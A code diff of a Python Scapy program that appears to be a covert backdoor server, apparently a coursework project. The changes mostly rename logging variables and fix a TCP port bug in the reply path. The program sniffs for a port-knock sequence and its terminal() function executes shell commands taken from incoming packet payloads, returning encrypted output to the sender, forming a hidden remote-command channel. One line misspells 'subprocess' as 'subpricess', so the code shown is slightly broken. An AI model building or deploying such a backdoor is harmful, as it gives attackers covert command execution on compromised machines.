@@ -70,16 +70,16 @@ def main():
 						packetFilter = packetFilter + " or ip src " + source
 				packetFilter = packetFilter + ")"
 
-			if len(log) > 0:
-				with open(log, "a") as logFile:
-					logFile.write("Server starting up at " + time.ctime() + "\n")
+			if len(logFile) > 0:
+				with open(logFile, "a") as serverLog:
+					serverLog.write("Server starting up at " + time.ctime() + "\n")
 
 			# Beginning Packet sniffing
 			sniff(filter=packetFilter, prn=server())
 		except KeyboardInterrupt:
-			if len(log) > 0:
-				with open(log, "a") as logFile:
-					logFile.write("Server shutting down at " + time.ctime() + "\n")
+			if len(logFile) > 0:
+				with open(logFile, "a") as serverLog:
+					serverLog.write("Server shutting down at " + time.ctime() + "\n")
 
 '''
 ------------------------------------------------------------------------------
@@ -244,9 +244,9 @@ def checkKnock(ip, port):
 ------------------------------------------------------------------------------
 '''
 def clientCommands(packet):
-	if len(log) > 0:
-		with open(log, "a") as logFile:
-			logFile.write("Connection Established with " + packet[IP].src + "at " + time.ctime() + "\n")
+	if len(logFile) > 0:
+		with open(logFile, "a") as serverLog:
+			serverLog.write("Connection Established with " + packet[IP].src + "at " + time.ctime() + "\n")
 
 	seq = random.randint(0, 16777215)
 	ipid = random.randint(0, 65535)
@@ -271,14 +271,14 @@ def clientCommands(packet):
 
 		# Beginning Packet sniffing
 		sniff(filter=packetFilter, prn=server(), timeout=300)
-		if len(log) > 0:
-			with open(log, "a") as logFile:
-				logFile.write("Connection with " + packet[IP].src + " timeout at " + time.ctime() + "\n")
+		if len(logFile) > 0:
+			with open(logFile, "a") as serverLog:
+				serverLog.write("Connection with " + packet[IP].src + " timeout at " + time.ctime() + "\n")
 
 	except SystemExit:
-		if len(log) > 0:
-			with open(log, "a") as logFile:
-				logFile.write("Connection with " + packet[IP].src + " terminated at " + time.ctime() + "\n")
+		if len(logFile) > 0:
+			with open(logFile, "a") as serverLog:
+				serverLog.write("Connection with " + packet[IP].src + " terminated at " + time.ctime() + "\n")
 
 '''
 ------------------------------------------------------------------------------
@@ -397,12 +397,12 @@ def getFile(packet):
 def terminal(packet):
 	output = subpricess.check_output(packet[RAW].load, stderr=subprocess.STDOUT)
 	confirmPacket = IP(dst=packet[IP].src, id=packet[IP].id+1)/\
-	                TCP(sport=random.randint(0, 65535), sport=packet[TCP].dport, seq=packet[TCP].seq+1)/\
+	                TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].seq+1)/\
 	                RAW(load=encrypt(output))
 	send(confirmPacket, verbose=0)
-	if len(log) > 0:
-		with open(log, "a") as logFile:
-			logFile.write("Results of \"" + packet[RAW].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")
+	if len(logFile) > 0:
+		with open(logFile, "a") as serverLog:
+			serverLog.write("Results of \"" + packet[RAW].load + "\" sent to " + packet[IP].src + " at " + time.ctime() + "\n")
 
 '''
 ---------------------------------------------------------------------------------------------
